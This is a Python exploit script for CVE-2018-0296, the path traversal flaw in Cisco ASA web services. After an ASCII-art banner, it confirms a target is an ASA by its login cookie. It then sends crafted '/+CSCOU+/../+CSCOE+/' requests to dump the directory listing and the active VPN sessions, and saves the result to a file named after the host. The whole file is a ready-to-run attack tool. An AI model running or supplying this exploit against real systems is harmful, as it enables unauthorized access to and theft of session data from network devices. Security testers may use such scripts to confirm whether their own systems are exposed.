#!/usr/bin/env python

import requests
import sys
import urlparse
import os

print("""
      _____ _____ _____ _____ _____    ___   _____  ___         
     /  __ \_   _/  ___/  __ \  _  |  / _ \ /  ___|/ _ \        
     | /  \/ | | \ `--.| /  \/ | | | / /_\ \\ `--./ /_\ \       
     | |     | |  `--. \ |   | | | | |  _  | `--. \  _  |       
     | \__/\_| |_/\__/ / \__/\ \_/ / | | | |/\__/ / | | |       
      \____/\___/\____/ \____/\___/  \_| |_/\____/\_| |_/        
                                                                
______     _   _       _____                                  _ 
| ___ \   | | | |     |_   _|                                | |
| |_/ /_ _| |_| |__     | |_ __ __ ___   _____ _ __ ___  __ _| |
|  __/ _` | __| '_ \    | | '__/ _` \ \ / / _ \ '__/ __|/ _` | |
| | | (_| | |_| | | |   | | | | (_| |\ V /  __/ |  \__ \ (_| | |
\_|  \__,_|\__|_| |_|   \_/_|  \__,_| \_/ \___|_|  |___/\__,_|_|
                                                                
                CVE-2018-0296
  Script author: Yassine Aboukir(@yassineaboukir)
    """)

requests.packages.urllib3.disable_warnings()

url = sys.argv[1]

dir_path = os.path.dirname(os.path.realpath(__file__))
filelist_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/"
CSCOE_dir = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b"
active_sessions = "/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions/"
logon = "/+CSCOE+/logon.html"

try:
  is_cisco_asa = requests.get(urlparse.urljoin(url,logon), verify=False, allow_redirects=False)
except requests.exceptions.RequestException as e:
  print(e)
  sys.exit(1)

if "webvpnLang" in is_cisco_asa.cookies:
    try:
      filelist_r = requests.get(urlparse.urljoin(url,filelist_dir), verify=False)
      CSCOE_r = requests.get(urlparse.urljoin(url,CSCOE_dir), verify=False)
      active_sessions_r = requests.get(urlparse.urljoin(url,active_sessions), verify=False)

    except requests.exceptions.RequestException as e:
      print(e)
      sys.exit(1)
    
    if str(filelist_r.status_code) == "200":
      with open(urlparse.urlparse(url).hostname+".txt", "w") as cisco_dump:
        cisco_dump.write("======= Directory Index =========\n {}\n ======== +CSCEO+ Directory ========\n {}\n ======= Active sessions =========\n {}".format(filelist_r.text, CSCOE_r.text, active_sessions_r.text))
        print("Vulnerable! Check the text dump saved in {}".format(dir_path))
    else: print("Not vulnerable!")
else: 
  print("This is not Cisco ASA! E.g: https://vpn.example.com/+CSCOE+/logon.html\n")
  sys.exit(1)

